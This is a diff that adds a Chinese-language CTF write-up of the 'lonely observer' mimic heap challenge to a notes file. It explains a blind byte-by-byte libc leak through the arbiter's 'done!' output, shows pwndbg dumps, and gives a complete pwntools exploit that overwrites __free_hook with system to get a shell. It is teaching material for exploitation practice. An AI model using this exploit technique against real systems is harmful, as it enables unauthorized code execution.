@@ -593,6 +593,235 @@ if __name__ == "__main__":
 	main(args["REMOTE"])
 ```
 
+## lonely observer
+
+**Hacking to the Gate!**
+
+原文链接:[https://www.anquanke.com/post/id/193939#h3-9](https://www.anquanke.com/post/id/193939#h3-9)
+
+记录下这有趣的一题（crtl c + crtl v
+
+这是一道拟态的堆体，这泄露的方法真的是太精妙了，真的很有趣，两个可执行程序都是UAF的漏洞，按照传统的解法两边的后端都要getshell，但是没有泄露的话，这几率非常小。但是比赛的时候大佬们看到了32位程序ASLR的[弱点]( http://blog2.eonew.cn/archives/12 )，用反弹shell绕过裁决器的限制，太秀了。
+
+不过正解的思路更是有趣
+
+出题人给的思路是：
+
+在输入和输出必须相同的情况下leak，在本题中是采用了一种类似时间盲注的方法，简单描述一下过程：
+
+add一个新的note时，会malloc一个0x10大小的chunk，然后将note的size与地址ptr存入其中，并且bss上只存储了这个记录用chunk的地址数组list。 
+
+edit时，将list指向的结构体中存放的size与ptr传参给read_n函数，在其中循环单字符读取直到读取数量等于size或者遇到换行符。 
+
+ 劫持list，将其错位指向一个libc地址 ：
+
+**mimic64:**
+
+```
+pwndbg> telescope 0x602060 20
+00:0000│   0x602060 (list) —▸ 0x1a73010 ◂— 0x1000
+01:0008│   0x602068 (list+8) —▸ 0x1a73050 ◂— 0x1
+02:0010│   0x602070 (list+16) —▸ 0x1a73090 ◂— 0x1
+03:0018│   0x602078 (list+24) —▸ 0x1a73070 ◂— 0x10
+04:0020│   0x602080 (list+32) ◂— 0x804b0900804b088
+05:0028│   0x602088 (list+40) ◂— 0x804b1e000000001
+06:0030│   0x602090 (list+48) ◂— 0x804b2e000000100
+07:0038│   0x602098 (list+56) ◂— 0x0
+08:0040│   0x6020a0 (list+64) —▸ 0x602045 (stderr@@GLIBC_2.2.5+5) ◂— 0x7f
+09:0048│   0x6020a8 (list+72) —▸ 0x6020c0 (list+96) ◂— 0x100
+0a:0050│   0x6020b0 (list+80) ◂— 0x0
+... ↓
+0c:0060│   0x6020c0 (list+96) ◂— 0x100
+0d:0068│   0x6020c8 (list+104) —▸ 0x602046 (stderr@@GLIBC_2.2.5+6) ◂— 0x6000000000000000
+0e:0070│   0x6020d0 (list+112) ◂— 0x0
+... ↓
+pwndbg> telescope 0x602045
+00:0000│   0x602045 (stderr@@GLIBC_2.2.5+5) ◂— 0x7f
+01:0008│   0x60204d —▸ 0x602360 ◂— 0x0
+02:0010│   0x602055 ◂— 0x0
+03:0018│   0x60205d ◂— 0x1a73010000000
+
+```
+
+**mimic32:**
+
+```
+pwndbg> telescope 0x804b060 20
+00:0000│   0x804b060 (list) —▸ 0x996c008 ◂— 0x1000
+01:0004│   0x804b064 (list+4) —▸ 0x996c028 ◂— 0x1
+02:0008│   0x804b068 (list+8) —▸ 0x996c048 ◂— 0x1
+03:000c│   0x804b06c (list+12) —▸ 0x996c038 ◂— 0x10
+04:0010│   0x804b070 (list+16) —▸ 0x996c058 ◂— 0x0
+05:0014│   0x804b074 (list+20) ◂— 0x0
+... ↓
+08:0020│   0x804b080 (list+32) —▸ 0x804b023 (stderr@@GLIBC_2.0+3) ◂— 0xf7
+09:0024│   0x804b084 (list+36) —▸ 0x804b090 (list+48) ◂— 0x100
+0a:0028│   0x804b088 (list+40) ◂— 0x0
+... ↓
+0c:0030│   0x804b090 (list+48) ◂— 0x100
+0d:0034│   0x804b094 (list+52) —▸ 0x804b024 ◂— 0xe0000000
+0e:0038│   0x804b098 (list+56) ◂— 0x0
+... ↓
+10:0040│   0x804b0a0 (list+64) ◂— 0x6020b0
+11:0044│   0x804b0a4 (list+68) ◂— 0x0
+12:0048│   0x804b0a8 (list+72) ◂— 0x6020c0
+13:004c│   0x804b0ac (list+76) ◂— 0x0
+pwndbg> telescope 0x804b023
+00:0000│   0x804b023 (stderr@@GLIBC_2.0+3) ◂— 0xf7
+01:0004│   0x804b027 —▸ 0x804b1e0 ◂— 0x0
+02:0008│   0x804b02b ◂— 0x0
+... ↓
+07:001c│   0x804b03f ◂— 0xf2b5a000
+```
+
+然后发送单字符过去，只有读满了0xf7（比如）这么多个字节，裁决器才会回显`done!`，因为裁决器`menu`里用的是`scanf`，所以可以一直发字符过去，最后在发送一个回车，这题即使`menu`输入的是非法的选项也不会输出任何东西，所以这样子可以一位一位的爆破出`libc`地址,这太精妙了，orz，最后同时改`__free_hook`为`system`来`getshell`
+
+exp：(抄原文的
+
+```python
+from pwn import *
+
+def cmd(c):
+	p.recvuntil(">>")
+	p.sendline(str(c))
+
+def add(idx,sz,content):
+	cmd(1)
+	p.recvuntil(">>")
+	p.sendline(str(idx))
+	p.recvuntil(">>")
+	p.sendline(str(sz))
+	p.recvuntil("content:")
+	p.send(content)
+def dele(idx):
+	cmd(2)
+	p.recvuntil(">>")
+	p.sendline(str(idx))
+def show(idx):
+	cmd(3)
+	p.recvuntil(">>")
+	p.sendline(str(idx))
+def edit(idx,content):
+	cmd(4)
+	p.recvuntil(">>")
+	p.sendline(str(idx))
+	p.recvuntil("content:")
+	p.send(content)
+def main(host,port=20508):
+	global p
+	if host:
+		p = remote(host,port)
+	else:
+		p = process("./lonely_observer")
+		# p = process("./mimic64")
+		# p = process("./lonely_observer",env={"LD_PRELOAD":"./libc.so.6"})
+		# gdb.attach(p)
+	
+	list64 = 0x602060
+	bss64 = 0x602060+0x10*0x30
+	list32 = 0x804b060
+	bss32 = 0x804b060+0x8*0x30
+	
+	add(0,1,'a')
+	add(1,1,'a')
+	add(2,1,'a')
+	dele(0)
+	dele(1)
+	edit(1,'\x00')
+	add(3,0x10,p64(0x1000)+p64(list64+8*4))
+	
+	dele(2)
+	edit(2,'\x00')
+	add(4,0x8,p32(0x1000)+p32(list32+4*8))
+	dele(2)
+	edit(2,'\x00')
+	
+	#leak
+	libc64.address = 0
+	for idx in range(5,0,-1):
+		buf = p32(list32+4*10) + p32(list32+4*12)
+		buf += p32(1) + p32(bss32)#8
+		buf += p32(0x100) + p32(bss32+0x100)#9
+		buf = buf.ljust(4*8,'\x00')
+	
+		buf	+= p64(0x602040+idx) + p64(list64+8*12)
+		buf	+= p64(0) + p64(0)#8
+		buf	+= p64(0x100) + p64(0x602041+idx)#9
+		buf	+= '\n'
+		edit(0,buf)
+		
+		edit(9,'\x00'*7 + p64(bss64) + '\n')
+		
+		p.sendlineafter('>>','4')
+		p.sendlineafter('index?','8')	
+		p.recvuntil("content:")
+		for sz in range(1,256):
+			p.send('5')
+			if 'done!' in p.recvrepeat(0.1):
+				libc64.address += sz << (idx*8)
+				success(hex(sz))
+				p.sendline('5'*(0x100-sz))
+				break
+			elif sz == 0xff:
+				print('failed')
+				exit(0)
+	libc64.address -= 0x3c5500
+	
+	
+	libc32.address = 0
+	for idx in range(3,0,-1):
+		buf = p32(0x804b020+idx) + p32(list32+4*12)
+		buf+= p32(0) + p32(0)#8
+		buf+= p32(0x100) + p32(0x804b021+idx)#9
+		buf = buf.ljust(4*8,'\x00')
+		
+		buf+= p64(list64+8*10) + p64(list64+8*12)
+		buf+= p64(1) + p64(bss64)#8
+		buf+= p64(0x100) + p64(bss64+0x100)#9
+		buf+= '\n'
+		edit(0,buf)
+		edit(9,'\x00'*3 + p32(bss32) + '\n')
+		
+		p.sendlineafter('>>','4')
+		p.sendlineafter('index?','8')
+		p.recvuntil("content:")
+		for sz in range(1,256):
+			p.send('5')
+			if 'done!' in p.recvrepeat(0.1):
+				libc32.address += sz << (idx*8)
+				success(hex(sz))
+				p.sendline('5'*(0x100-sz))
+				break
+			elif sz == 0xff:
+				print('failed')
+				exit(0)
+	libc32.address -= 0x1b2c00
+	info("libc32 : " + hex(libc32.address))
+	info("libc64 : " + hex(libc64.address))
+	
+	buf = p32(list32+4*10) + p32(list32+4*12)
+	buf+= p32(4) + p32(libc32.sym['__free_hook'])#8
+	buf+= p32(8) + p32(bss32)#9
+	buf = buf.ljust(4*8,'\x00')
+	
+	buf+= p64(list64+8*10) + p64(list64+8*12)
+	buf+= p64(4) + p64(bss64)#8
+	buf+= p64(8) + p64(libc64.sym['__free_hook'])#9
+	buf+= '\n'
+	edit(0,buf)
+	edit(8,p32(libc32.sym['system']))
+	edit(9,p64(libc64.sym['system']))
+	add(0x20,0x20,'/bin/sh\n')
+	dele(0x20)
+	
+	p.interactive()
+	
+if __name__ == "__main__":
+	libc64 = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
+	libc32 = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)
+	main(args["REMOTE"])
+```
+
 
 
 
